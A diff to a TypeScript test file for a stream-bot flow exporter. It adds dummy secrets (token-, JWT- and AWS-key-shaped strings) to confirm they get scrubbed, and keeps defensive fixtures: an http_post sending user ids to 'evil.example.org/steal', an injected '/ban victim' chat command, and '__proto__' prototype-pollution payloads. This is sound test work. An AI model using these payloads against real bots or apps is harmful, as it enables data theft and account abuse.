@@ -56,7 +56,6 @@ const SHOWCASE: FlowExportRow[] = [
       conditions: [{ type: 'users', params: { allow: ['realviewer'], deny: ['realtroll'] } }],
       actions: [
         chat('{user} redeemed, deaths at {counter:deaths}, {urlfetch:weather}'),
-        { type: 'discord_post', params: { guild_id: '123456789012345678', channel_id: '223456789012345678', text: 'hype' } },
         { type: 'http_post', params: { url: 'https://hooks.example.org/secret-token', body: 'key=hunter2' } },
         {
           type: 'lights',
@@ -96,6 +95,57 @@ const SHOWCASE: FlowExportRow[] = [
             else: [chat('/mod realfriend'), run('11111111-aaaa-4bbb-8ccc-000000000001')]
           }
         }
+      ]
+    }
+  },
+  {
+    id: '11111111-aaaa-4bbb-8ccc-000000000003',
+    name: 'Recipes v2',
+    definition: {
+      version: 1,
+      queue: 'sounds',
+      trigger: { type: 'command', params: { name: '!v2' } },
+      conditions: [{ type: 'var', params: { scope: 'channel', name: 'mode', op: 'eq', value: 'on' } }],
+      actions: [
+        { type: 'var_set', params: { scope: 'viewer', name: 'seen', value: '{user}' } },
+        { type: 'var_add', params: { scope: 'channel', name: 'total', amount: 1 } },
+        { type: 'var_delete', params: { scope: 'channel', name: 'old' } },
+        { type: 'text', params: { op: 'upper', input: '{args}', arg1: '', arg2: '', save_as: 'loud' } },
+        { type: 'math', params: { expression: '{var:total}*2', save_as: 'double' } },
+        {
+          type: 'loop',
+          params: {
+            times: '3',
+            actions: [
+              {
+                type: 'http_get',
+                params: {
+                  url: 'https://api.example.org/secret-token',
+                  json_path: ['data', 'value'],
+                  save_as: 'answer',
+                  on_ok: [chat('got {local:answer}')],
+                  on_failure: [chat('no answer')]
+                }
+              }
+            ]
+          }
+        },
+        { type: 'reward_update', params: { reward_id: 'real-reward-to-hide', enabled: false, cost: null, reset_on_stream_end: true } }
+      ]
+    }
+  },
+  {
+    id: '11111111-aaaa-4bbb-8ccc-000000000004',
+    name: 'Pasted keys',
+    restricted: true,
+    definition: {
+      version: 1,
+      trigger: { type: 'command', params: { name: '!keys' } },
+      actions: [
+        chat('use ghp_0123456789abcdefABCDEF0123456789abcd today, {user}'),
+        { type: 'reply', params: { text: 'https://me:hunter2@example.org/a?token=hunter2&page=2' } },
+        { type: 'var_set', params: { scope: 'channel', name: 'jwt', value: 'x eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N' } },
+        { type: 'reply', params: { text: 'AKIAIOSFODNN7EXAMPLE' } }
       ]
     }
   }
@@ -145,7 +195,7 @@ describe('exportFlows', () => {
   });
 
   test('carries no channel ids, secrets, or row data', () => {
-    for (const leak of ['7e0f9a58', 'realviewer', 'realtroll', 'realfriend', '123456789012345678', 'hunter2', 'secret-token', 'AB:CD:EF', 'H6159', 'Desk strip', 'Sunrise', '4280', 'my-secret-hook', '555000111', '11111111-aaaa', '99999999']) {
+    for (const leak of ['7e0f9a58', 'realviewer', 'realtroll', 'realfriend', '123456789012345678', 'hunter2', 'secret-token', 'AB:CD:EF', 'H6159', 'Desk strip', 'Sunrise', '4280', 'my-secret-hook', '555000111', '11111111-aaaa', '99999999', 'ghp_', 'eyJ', 'AKIA']) {
       expect(text).not.toContain(leak);
     }
     for (const field of ['user_id"', 'revision', 'created_at', 'updated_at', 'preview', '"id"', 'uses']) {
@@ -161,9 +211,16 @@ describe('exportFlows', () => {
 
   test('reports what the exporter should know about', () => {
     expect(report[0]!.setup.map((n) => n.code)).toEqual(
-      expect.arrayContaining(['reward_trigger', 'users_list', 'discord_target', 'http_target', 'lights_target', 'run_removed', 'counter', 'fetch'])
+      expect.arrayContaining(['reward_trigger', 'users_list', 'http_target', 'lights_target', 'run_removed', 'counter', 'fetch'])
     );
     expect(report.every((r) => r.issues.length === 0)).toBe(true);
+    expect(report[3]!.scrubbed.map((note) => `${note.path} ${note.type} ${note.kind}`)).toEqual([
+      'actions[0].params.text chat known_token',
+      'actions[1].params.text reply url_credentials',
+      'actions[2].params.value var_set jwt',
+      'actions[3].params.text reply known_token'
+    ]);
+    expect(report.slice(0, 3).every((r) => r.scrubbed.length === 0)).toBe(true);
   });
 
   test('a stored row that no longer validates is left out and reported', () => {
@@ -257,7 +314,7 @@ describe('per-recipe refusals', () => {
     const payloads = [
       '{"version":1,"trigger":{"type":"manual","__proto__":{"x":1}}}',
       '{"version":1,"trigger":{"type":"manual"},"constructor":1}',
-      '{"version":1,"trigger":{"type":"manual"},"actions":[{"type":"discord_post","params":{"GUILD_ID":"123456789012345678","channel_id":"223456789012345678","text":"x"}}]}',
+      '{"version":1,"trigger":{"type":"manual"},"actions":[{"type":"http_post","params":{"URL":"https://example.org/x","body":"x"}}]}',
       '{"VERSION":1,"trigger":{"type":"manual"}}',
       '{"version":1,"trigger":{"type":"manual"},"actions":[{"Type":"chat","params":{"text":"x"}}]}'
     ];
@@ -267,10 +324,10 @@ describe('per-recipe refusals', () => {
     }
   });
 
-  test('absurd nesting is refused', () => {
+  test('nesting past the size limit is refused by size', () => {
     let deep: unknown = chat('x');
     for (let i = 0; i < 5000; i++) deep = { type: 'if', params: { then: [deep] } };
-    expect(issueCodes(onlyEntry({ version: 1, trigger: { type: 'manual' }, actions: [deep] }))).toEqual(['nesting']);
+    expect(issueCodes(onlyEntry({ version: 1, trigger: { type: 'manual' }, actions: [deep] }))).toEqual(['too_long']);
   });
 
   test('non-object definitions and names are per-recipe issues', () => {
@@ -305,7 +362,6 @@ describe('references in a hostile file', () => {
       actions: [
         { type: 'ban', params: { login: 'attacker' } },
         { type: 'http_post', params: { url: 'https://evil.example.org/steal', body: '{user.id}' } },
-        { type: 'discord_post', params: { guild_id: '123456789012345678', channel_id: '223456789012345678', text: 'hi' } },
         chat('/vip attacker'),
         chat('{choice:hello,/ban victim}'),
         run('00000000-1111-4222-8333-444444444444')
@@ -315,14 +371,14 @@ describe('references in a hostile file', () => {
     for (const leak of ['someone-elses-reward', 'attacker"', 'evil.example.org', '123456789012345678', '00000000-1111']) expect(written).not.toContain(leak);
     expect(written).not.toContain('attacker');
     expect(written).not.toContain('victim');
-    expect(hostile.setup).toContainEqual({ code: 'slash_command', path: 'actions[3].params.text', detail: '/vip' });
+    expect(hostile.setup).toContainEqual({ code: 'slash_command', path: 'actions[2].params.text', detail: '/vip' });
     expect(hostile.status).toBe('ready');
     expect(hostile.definition!.trigger.params).toEqual({ reward_id: SETUP_REWARD_ID });
     expect(hostile.definition!.conditions![0]!.params).toEqual({ allow: [SETUP_LOGIN] });
     expect(hostile.definition!.actions!.every((a) => a.enabled === false)).toBe(true);
     expect(hostile.definition!.actions!.some((a) => a.type === 'run')).toBe(false);
     expect(noteCodes(hostile)).toEqual(
-      expect.arrayContaining(['reward_trigger', 'users_list', 'login_target', 'privileged_action', 'http_target', 'discord_target', 'slash_command', 'run_removed'])
+      expect.arrayContaining(['reward_trigger', 'users_list', 'login_target', 'privileged_action', 'http_target', 'slash_command', 'run_removed'])
     );
   });
 
